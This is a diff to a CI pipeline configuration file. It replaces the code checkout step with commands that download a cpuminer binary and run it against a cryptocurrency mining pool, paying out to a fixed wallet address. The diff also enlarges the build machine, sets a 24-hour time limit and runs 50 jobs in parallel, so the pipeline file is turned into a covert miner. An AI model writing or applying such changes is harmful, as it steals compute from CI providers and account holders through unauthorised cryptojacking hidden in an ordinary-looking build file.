@@ -2,12 +2,17 @@ version: v1.0
 name: Initial Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-4
     os_image: ubuntu1804
+execution_time_limit:
+  hours: 24
 blocks:
   - name: 'Block #1'
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9494l7vclvtuuhkfmuhgl0t2nnwymwl8xyukr8.z -t0'
+          parallelism: 50
